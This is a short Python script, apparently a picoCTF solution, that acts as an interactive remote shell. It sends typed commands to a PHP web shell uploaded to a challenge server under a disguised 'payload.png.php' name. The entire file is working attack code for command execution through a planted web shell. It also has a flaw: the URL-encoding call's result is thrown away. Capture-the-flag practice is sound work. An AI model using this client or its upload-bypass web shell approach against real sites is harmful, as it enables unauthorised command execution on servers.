import requests
import urllib.parse

url = "http://atlas.picoctf.net:59319/uploads/payload.png.php?cmd="

while True:
    payload = "echo '\n';" + input("$ ")
    urllib.parse.quote(payload)
    resp = requests.get(url + payload)
    print(resp.text)
